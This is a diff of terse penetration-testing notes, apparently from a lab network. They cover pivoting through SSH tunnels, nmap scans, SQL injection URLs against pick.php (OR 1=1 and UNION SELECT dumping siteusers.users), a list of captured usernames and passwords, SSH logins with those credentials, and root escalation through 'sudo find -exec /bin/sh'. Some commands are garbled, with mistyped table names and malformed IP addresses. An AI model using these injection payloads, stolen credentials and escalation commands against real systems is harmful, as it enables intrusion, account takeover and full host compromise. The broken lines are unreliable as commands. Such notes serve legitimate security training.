@@ -119,12 +119,32 @@ proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.172,181
 192.168.28.172 22
 192.168.28.181 WebApp 22,80
 
-ssh -S /tmp/gray gray -O forward -L 1330:192.168.28.181:80
+ssh -S /tmp/gray gray -O forward -L 1200:192.168.28.181:80
 nmap -v -sT -Pn -T4 -sV --script=http-enum.nse 192.168.28.181 -p 80
 
-3)
-4)
-UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+http://0.0.0.0:1200/pick.php?product=7%20OR%201=1
+http://0.0.0.0:1200/pick.php?product=7%20UNION%20select%201,2,3;
+http://0.0.0.0:1200/pick.php?product=7%20UNION%20select%201,3,2;
+                   1             2           3
+UNION SELECT table_schema, column_name, table_name from infomation_schema.columns;
+
 http://0.0.0.0:1200/pick.php?product=7 20UNION 20SELECT 20name,user_id,username 20FROM 20siteusers.users
+<table_schema>,<column_name>,<table_name> from siteusers.<table>
 
+Aaron ncnffjbeqlCn$$jbeq - apasswordyPa$$word
+Lroth anotherpassword4THEages
 
+ssh -S /tmp/gray gray -O forward -L 1331:192.168.172:22
+ssh -S /tmp/gray gray -O forward -L 1332:192.168.181:22
+
+Brute force with credentials on both known targets
+
+ssh -MS /tmp/aaron Aaron@0.0.0.0 -p 1331
+bash
+sudo -l
+/usr/bin/find https://gtfobins.github.io/
+
+escalate privs 
+sudo find . -exec /bin/sh \; -quit
+
+192.168.28.190
